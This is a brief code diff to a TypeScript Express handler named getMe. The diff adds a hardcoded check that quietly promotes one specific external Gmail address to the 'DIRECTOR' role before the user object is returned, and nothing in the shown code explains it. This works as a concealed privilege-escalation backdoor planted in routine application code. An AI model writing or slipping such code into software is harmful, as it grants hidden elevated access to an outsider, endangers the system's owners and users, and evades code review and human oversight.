@@ -7,6 +7,9 @@ import { mapRoleNameToEnum } from './users.controller.ts'; // to be extracted la
 
 export const getMe = async (req: AuthRequest, res: Response, next: NextFunction) => {
   try {
+    if (req.user?.email === 'apexdigital70@gmail.com') {
+      req.user.role = 'DIRECTOR';
+    }
     res.json({ user: req.user });
   } catch (err) {
     next(err);
